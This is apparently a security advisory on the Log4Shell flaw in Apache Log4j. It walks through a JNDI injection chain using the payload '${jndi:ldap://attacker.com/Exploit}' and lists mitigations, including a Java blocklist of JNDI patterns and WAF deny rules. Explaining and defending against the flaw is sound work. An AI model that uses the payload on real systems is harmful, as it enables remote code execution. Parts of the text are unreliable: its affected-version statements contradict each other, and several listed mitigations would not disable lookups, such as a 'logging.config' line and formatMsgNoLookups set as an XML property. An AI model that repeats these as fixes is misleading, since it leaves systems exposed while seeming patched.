= CVE-2021-44228: Apache Log4j Remote Code Execution (Log4Shell)

== Overview

CVE-2021-44228, commonly known as **Log4Shell**, is a critical Remote Code Execution (RCE) vulnerability in Apache Log4j 2.x versions prior to 2.17.0. This vulnerability allows unauthenticated attackers to execute arbitrary code on systems using vulnerable versions of Log4j through JNDI (Java Naming and Directory Interface) injection.

**Severity**: CVSS 10.0 (Critical)
**Affected**: Log4j 2.0-beta9 through 2.15.0
**Fixed in**: Log4j 2.17.0, 2.12.2, 2.3.1

== Vulnerability Details

=== Root Cause

Log4j 2 supports message interpolation using the `${}` syntax. The library automatically resolves lookup expressions during logging operations. One of these built-in lookups is JNDI, which allows applications to look up and instantiate objects from remote LDAP, RMI, or DNS servers without validation.

=== Why It's Vulnerable

1. **Unrestricted JNDI Lookups**: Log4j allows arbitrary JNDI lookups via `${jndi:ldap://...}`
2. **No Input Validation**: User-supplied data logged without sanitization
3. **Remote Class Loading**: LDAP can return serialized Java objects with arbitrary code
4. **Automatic Message Interpolation**: Lookups are processed automatically during log operations
5. **Wide Attack Surface**: Any endpoint that logs user input is vulnerable

== Attack Vector

=== JNDI Injection Overview

JNDI (Java Naming and Directory Interface) is a Java API that allows applications to look up objects from:
- **LDAP** (Lightweight Directory Access Protocol)
- **RMI** (Remote Method Invocation)
- **DNS** (Domain Name System)

The attacker controls what object is returned from these services.

=== Exploitation Chain

[source]
----
1. Attacker sends malicious payload in request
   └─> "${jndi:ldap://attacker.com/Exploit}"

2. Application logs user input containing the payload
   └─> log.info("Request: {}", userInput)

3. Log4j processes the message and finds ${} expression
   └─> Triggers lookup mechanism

4. JNDI resolver connects to attacker's LDAP server
   └─> Requests object from ldap://attacker.com/Exploit

5. Attacker's LDAP server returns serialized Java object
   └─> ObjectFactory with malicious deserialization code

6. Log4j deserializes the object
   └─> Constructor/static initializer executes arbitrary code

7. Remote Code Execution achieved
   └─> Attacker gains system access with application privileges
----

== Remediation Strategies

=== 1. Upgrade Log4j (Immediate)

Update to patched versions:

[source,xml]
----
<!-- Option 1: Latest stable -->
<dependency>
    <groupId>org.apache.logging.log4j</groupId>
    <artifactId>log4j-core</artifactId>
    <version>2.17.1</version>
</dependency>

<!-- Option 2: If stuck on 2.12.x -->
<dependency>
    <groupId>org.apache.logging.log4j</groupId>
    <artifactId>log4j-core</artifactId>
    <version>2.12.2</version>
</dependency>
----

=== 2. Disable JNDI Lookups (Temporary)

Add JVM system property to disable JNDI:

[source,bash]
----
# Via command line
java -Dlog4j2.formatMsgNoLookups=true -jar application.jar

# Via environment variable
export LOG4J_FORMAT_MSG_NO_LOOKUPS=true

# In application.properties
logging.config=log4j2.properties
----

=== 3. Configuration File Mitigation

Disable message lookup in Log4j configuration:

[source,xml]
----
<!-- log4j2.xml -->
<?xml version="1.0" encoding="UTF-8"?>
<Configuration packages="org.apache.logging.log4j.core"
               noConsoleNoAnsi="false">
    <Properties>
        <!-- Disable message lookups -->
        <Property name="log4j2.formatMsgNoLookups">true</Property>
    </Properties>
    <Appenders>
        <Console name="Console" target="SYSTEM_OUT">
            <PatternLayout pattern="%d{HH:mm:ss.SSS} [%t] %-5level %logger{36} - %msg%n"/>
        </Console>
    </Appenders>
    <Loggers>
        <Root level="info">
            <AppenderRef ref="Console"/>
        </Root>
    </Loggers>
</Configuration>
----

=== 4. Input Validation & Sanitization

Remove or escape potentially dangerous patterns:

[source,java]
----
private String sanitizeInput(String input) {
    // Remove JNDI lookup patterns
    if (input == null) return input;
    
    // Reject common dangerous patterns
    String[] dangerousPatterns = {
        "${jndi:",
        "${j",
        "jndi:ldap",
        "jndi:rmi",
        "jndi:dns"
    };
    
    String lowerInput = input.toLowerCase();
    for (String pattern : dangerousPatterns) {
        if (lowerInput.contains(pattern)) {
            throw new IllegalArgumentException("Dangerous input detected");
        }
    }
    return input;
}

// Usage
@PostMapping("/api/endpoint")
public void handleRequest(@RequestHeader("X-Api-Version") String version) {
    String safe = sanitizeInput(version);
    log.info("API version: {}", safe);
}
----

=== 5. Web Application Firewall (WAF) Rules

[source]
----
# Block requests containing JNDI patterns
SecRule REQUEST_HEADERS|ARGS|REQUEST_BODY|COOKIES \
    "(?i)\$\{.*jndi:" \
    "id:1000,phase:2,deny,log,msg:'Log4Shell JNDI Injection Attempt'"

# Block specific LDAP/RMI schemes
SecRule REQUEST_HEADERS|ARGS \
    "(?i)(jndi:|ldap:|rmi:)" \
    "id:1001,phase:2,deny,log,msg:'JNDI Protocol Detected'"
----
